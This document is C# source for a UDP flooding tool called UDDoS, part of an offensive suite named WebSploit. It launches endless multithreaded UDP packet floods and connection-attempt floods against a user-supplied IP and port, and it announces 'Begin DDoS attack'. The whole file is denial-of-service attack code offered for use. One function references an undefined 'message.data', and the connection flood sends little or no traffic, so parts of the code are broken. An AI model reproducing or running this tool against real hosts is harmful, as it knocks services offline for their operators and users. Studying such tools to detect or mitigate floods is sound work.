/*
 *  UDP Packet Flooder
 *
 *  Copyright (C) 2021 MishDotCom <mishdotcomdev@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

using System;
using System.Text;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace WebSploit.UDDoS
{
    class UdpDDoS
    {
        public static int count = 0;

        public static void SendPackage(string ip, int port, int threads)
        {
            SetupAttackEnv(ip);
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    byte[] package = message.data;
                    while(true)
                    {
                        IPEndPoint ep = new IPEndPoint(IPAddress.Parse(ip), port);
                        Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                        try
                        {
                            sock.SendTo(package, ep);
                            count++;
                            Console.WriteLine("udphv/> Pacakge sent through UDP to {0} || Count > " + count.ToString(), ip);
                        }
                        catch(SocketException)
                        {
                            Console.WriteLine("Server is down!");
                        }
                    }
                });
                ths[i].Start();
            }
        }

        public static void UdpConnectionFlood(string ip, int port, int threads)
        {
            SetupAttackEnv(ip);
            int counter = 0;
            Thread[] ths = new Thread[threads];
            for(int i = 0; i < ths.Length; i++)
            {
                ths[i] = new Thread(() => {
                    while(true)
                    {
                        try
                        {
                            using(UdpClient client = new UdpClient())
                            {
                                client.Connect(IPAddress.Parse(ip), port);
                                counter++;
                                Console.WriteLine($"udp/cnnct/> UDP Connection attempt flood on {ip}:{port} >> count {counter}");
                            }
                        }
                        catch(Exception)
                        {
                            Console.WriteLine($"[>] Server not responding on {ip}:{port}");
                        }
                    }
                });
                ths[i].Start();
            }
        }

        static void SetupAttackEnv(string ip)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("UDDoS"));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("UDDoS v1.4 © 2021 MishDotCom");
            Console.WriteLine("Part of the WebSploit suite.");
            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"Target : {ip}");
            Console.WriteLine("[INFO] : Begin DDoS attack...\n");
            Console.ForegroundColor = ConsoleColor.White;
            Thread.Sleep(150);
        }
    }
}